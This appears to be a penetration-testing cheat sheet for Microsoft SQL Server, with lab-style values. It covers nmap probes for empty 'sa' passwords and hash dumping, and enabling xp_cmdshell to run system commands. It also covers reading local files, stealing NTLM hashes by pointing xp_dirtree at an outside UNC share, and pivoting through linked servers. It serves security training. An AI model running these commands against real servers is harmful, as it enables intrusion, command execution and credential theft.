- [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

# Nmap

```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $IP
```

# Service Interaction

## impacket-mssqlclient

```bash
python3 mssqlclient.py Administrator@$IP
python3 mssqlclient.py Administrator@$IP -windows-auth
```

# sqsh

```bash
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database> #Windows
```

# Metasploit

```text
use scanner/mssql/mssql_ping
```

---

| **Command**                                                                                                                | **Description**                                                                                               |
| -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------- |
| `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`                                                      | Connecting to the MSSQL server.                                                                               |
| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`                                                                        | Connecting to the MSSQL server from Linux.                                                                    |
| `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`                                                                     | Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server. |
| `sqlcmd> SELECT name FROM master.dbo.sysdatabases`                                                                         | Show all available databases in MSSQL.                                                                        |
| `sqlcmd> USE htbusers`                                                                                                     | Select a specific database in MSSQL.                                                                          |
| `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`                                                                 | Show all available tables in the selected database in MSSQL.                                                  |
| `sqlcmd> SELECT * FROM users`                                                                                              | Select all available entries from the "users" table in MSSQL.                                                 |
| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1`                                                                  | To allow advanced options to be changed.                                                                      |
| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`                                                                            | To enable the xp_cmdshell.                                                                                    |
| `sqlcmd> RECONFIGURE`                                                                                                      | To be used after each sp_configure command to apply the changes.                                              |
| `sqlcmd> xp_cmdshell 'whoami'`                                                                                             | Execute a system command from MSSQL server.                                                                   |
| `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`                 | Read local files in MSSQL.                                                                                    |
| `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'`                                                                  | Hash stealing using the `xp_dirtree` command in MSSQL.                                                        |
| `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'`                                                                  | Hash stealing using the `xp_subdirs` command in MSSQL.                                                        |
| `sqlcmd> SELECT srvname, isremote FROM sysservers`                                                                         | Identify linked servers in MSSQL.                                                                             |
| `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | Identify the user and its privileges used for the remote connection in MSSQL.                                 |
